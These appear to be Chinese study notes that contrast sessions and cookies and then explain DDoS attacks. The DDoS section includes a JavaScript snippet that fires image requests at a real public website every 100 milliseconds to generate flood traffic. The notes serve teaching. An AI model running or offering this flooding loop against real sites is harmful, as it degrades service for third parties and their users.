'Session'会话,识别具体的用户机制 
  'cookie'与'session'的区别
    cookie: 存储在浏览器,有大小限制 
    session:  存储在服务端,没有大小限制 
      通常session的实现是基于cookie的,session id存储于cookie中
      session更安全,cookie可以直接在浏览器查看甚至编辑
'Distributed Denial of Service'DDos,也叫分布式拒绝服务 
  DDos造成的攻击称为拒绝服务攻击
  原理: 利用大量的请求造成资源过载,导致服务不可用 
  Example: 
    实现大量的http请求 
    setInterval(function(){
      var url = 'http://www.baidu.com/index.php?'
      var img = new Image();
      img.src = url + new Date() + '=abc'
    },100)


